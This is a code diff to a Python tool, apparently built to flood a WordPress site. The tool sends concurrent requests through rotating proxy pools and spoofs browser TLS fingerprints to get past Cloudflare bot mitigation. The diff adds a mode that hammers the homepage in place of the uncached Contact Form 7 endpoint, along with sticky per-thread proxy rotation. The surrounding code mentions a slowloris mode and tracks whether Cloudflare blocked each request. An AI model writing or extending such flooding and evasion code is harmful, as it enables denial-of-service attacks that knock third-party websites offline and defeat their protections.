@@ -139,13 +139,22 @@ PROFILE_CYCLE = ProfileCycle(BROWSER_PROFILES)
 # window just reset" by running rotating vs fixed back-to-back.
 FIXED_PROFILE = None
 
+# Set by --homepage: GET the domain's homepage instead of POSTing to the CF7
+# feedback endpoint. Same proxy pool / profile rotation / concurrency infra,
+# different request — isolates whether a cached, low-cost GET behaves
+# differently under flood than the always-uncached CF7 POST.
+HOMEPAGE_MODE = False
+
 
 # ─────────────────────────────────────────────────────────────────────────────
 #  PROXY POOL
 # ─────────────────────────────────────────────────────────────────────────────
 
 class ProxyPool:
-    def __init__(self, path):
+    def __init__(self, path, rotate_interval=0):
+        # rotate_interval > 0: hold ONE proxy fixed for that many seconds,
+        # then advance to the next — instead of a new proxy every request.
+        self.rotate_interval = rotate_interval
         # Authenticated proxy lists (Webshare etc.) ship as bare host:port —
         # credentials come from PROXY_USER/PROXY_PASS env vars at load time,
         # so no secret ever lands in a file that could get committed.
@@ -176,10 +185,27 @@ class ProxyPool:
         self._cycle = itertools.cycle(self.proxies)
         self._lock  = threading.Lock()
         self._dead  = set()
-        print(f"  {G}[PROXY]{W} {len(self.proxies)} proxies loaded from {path}")
+        mode = (f"sticky per slot, rotates every {self.rotate_interval}s"
+                if self.rotate_interval > 0 else "round-robin per request")
+        print(f"  {G}[PROXY]{W} {len(self.proxies)} proxies loaded from {path} ({mode})")
 
-    def next(self):
+    def next(self, slot=None):
         with self._lock:
+            if self.rotate_interval > 0:
+                # Each concurrent slot (thread) gets its OWN proxy — never share
+                # one proxy across concurrent requests, that serializes them on
+                # a single backbone connection slot and causes timeouts. Every
+                # slot's assigned proxy shifts together once per interval.
+                n = len(self.proxies)
+                generation = int(time.time() // self.rotate_interval)
+                base = (slot if slot is not None else 0) % n
+                for offset in range(n):
+                    idx = (base + generation + offset) % n
+                    p = self.proxies[idx]
+                    if p not in self._dead:
+                        return p
+                return None
+
             for _ in range(len(self.proxies)):
                 p = next(self._cycle)
                 if p not in self._dead:
@@ -278,7 +304,7 @@ def build_multipart(form_id, unit_tag):
 def send_one(req_num, cfg, pool):
     proxy = None
     if pool is not None:
-        proxy = pool.next()
+        proxy = pool.next(slot=req_num)
         if not proxy:
             return req_num, 0, 0, "N/A", "none", "all proxies dead", "N/A"
 
@@ -291,16 +317,28 @@ def send_one(req_num, cfg, pool):
 
     t0 = time.time()
     try:
-        r = cf_requests.post(
-            cfg["url"],
-            multipart=build_multipart(cfg["form_id"], cfg["unit_tag"]),
-            headers={"Origin": f"https://{domain}", "Referer": f"https://{domain}/", "User-Agent": ua},
-            proxies={"http": proxy, "https": proxy} if proxy else None,
-            impersonate=impersonate,
-            timeout=25,
-        )
+        if HOMEPAGE_MODE:
+            r = cf_requests.get(
+                f"https://{domain}/",
+                headers={"User-Agent": ua},
+                proxies={"http": proxy, "https": proxy} if proxy else None,
+                impersonate=impersonate,
+                timeout=25,
+            )
+        else:
+            r = cf_requests.post(
+                cfg["url"],
+                multipart=build_multipart(cfg["form_id"], cfg["unit_tag"]),
+                headers={"Origin": f"https://{domain}", "Referer": f"https://{domain}/", "User-Agent": ua},
+                proxies={"http": proxy, "https": proxy} if proxy else None,
+                impersonate=impersonate,
+                timeout=25,
+            )
         elapsed = time.time() - t0
         cache   = r.headers.get("cf-cache-status", "N/A")
+        ls_cache = r.headers.get("x-litespeed-cache", "")
+        if ls_cache:
+            cache = f"{cache}/ls:{ls_cache}"
         mit     = r.headers.get("cf-mitigated", "")
         # cf-mitigated present = Cloudflare intercepted, not the origin
         code    = r.status_code if not mit else 999
@@ -529,6 +567,15 @@ def main():
     p.add_argument("--no-proxy",    action="store_true",
                    help="Skip the proxy pool entirely — send every request from this\n"
                         "machine's own IP (still uses TLS impersonation).")
+    p.add_argument("--proxy-rotate-interval", type=float, default=0, metavar="SECONDS",
+                   help="Hold one proxy fixed for SECONDS, then advance to the next,\n"
+                        "instead of a new proxy every request (default: 0 = per-request).\n"
+                        "Example: --proxy-rotate-interval 30")
+    p.add_argument("--homepage",    action="store_true",
+                   help="GET the domain's homepage instead of POSTing to the CF7\n"
+                        "feedback endpoint. Same concurrency/proxy/profile rotation —\n"
+                        "isolates whether a cached GET behaves differently under\n"
+                        "flood than the always-uncached CF7 POST.")
     p.add_argument("--verbose",     action="store_true",
                    help="Show every request")
     p.add_argument("--delay",       type=float, default=0,
@@ -558,6 +605,10 @@ def main():
             print(f"  Available: {', '.join(p[0] for p in BROWSER_PROFILES)}\n")
             sys.exit(1)
         FIXED_PROFILE = match
+
+    if args.homepage:
+        global HOMEPAGE_MODE
+        HOMEPAGE_MODE = True
 
     # ── slowloris: domain not required, can run standalone with --origin ─────
     if args.slowloris:
@@ -594,7 +645,7 @@ def main():
         pool = None
     else:
         try:
-            pool = ProxyPool(args.proxy_file)
+            pool = ProxyPool(args.proxy_file, rotate_interval=args.proxy_rotate_interval)
         except FileNotFoundError:
             print(f"\n  {R}[ERROR]{W} Proxy file not found: {args.proxy_file}")
             print(f"  Run: python3 proxy_tester.py\n")
